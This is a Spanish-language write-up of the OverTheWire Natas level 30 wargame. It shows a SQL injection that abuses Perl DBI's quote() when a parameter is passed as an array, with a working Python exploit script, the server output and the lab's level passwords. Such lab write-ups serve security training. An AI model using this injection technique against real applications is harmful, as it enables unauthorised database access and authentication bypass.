# Natas 30

#### URL: http://natas30.natas.labs.overthewire.org
#### Credenciales: natas30:WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH

El método quote toma el valor obtenido y lo escapa adecuadamente para que sea seguro incluirlo en una consulta SQL:
```perl
my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password'));
```

Si se llama a quote() con una lista de valores, y el segundo valor es un entero, se puede hacer que quote() devuelva un valor sin comillas. En otras palabras, si se proporciona un array, se llamará a la segunda definición de quote() en lugar de la primera, que era la prevista:

``` python
import requests
from base64 import b64encode

URL="http://natas30.natas.labs.overthewire.org/index.pl"
headers={'Authorization': f'Basic {b64encode(b"natas30:WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH").decode()}'}
data={"username": "natas31", "password": ["'' OR '1' = '1';-- ", 4]}
x = requests.post(URL,headers=headers,data=data)
print(x.text)
```

```
python3 natas30_sploit.py
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas30", "pass": "WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">

<!-- morla/10111 <3  happy birthday OverTheWire! <3  -->

<h1>natas30</h1>
<div id="content">

<form action="index.pl" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
win!<br>here is your result:<br>natas31m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

`natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y`

PD: https://security.stackexchange.com/questions/175703/is-this-perl-database-connection-vulnerable-to-sql-injection/175872#175872

